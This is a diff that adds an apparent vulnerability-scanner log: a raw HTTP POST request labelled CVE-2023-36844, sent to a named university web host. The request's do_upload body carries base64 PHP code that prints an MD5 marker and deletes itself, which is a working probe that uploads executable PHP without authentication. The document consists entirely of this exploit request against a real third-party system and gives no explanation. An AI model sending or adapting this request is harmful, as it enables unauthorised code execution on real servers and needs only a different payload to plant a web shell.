@@ -1,0 +1,12 @@
+[CVE-2023-36844] Dumped HTTP request for http://colleges.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: colleges.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "abbac.php", "csize": 56}]
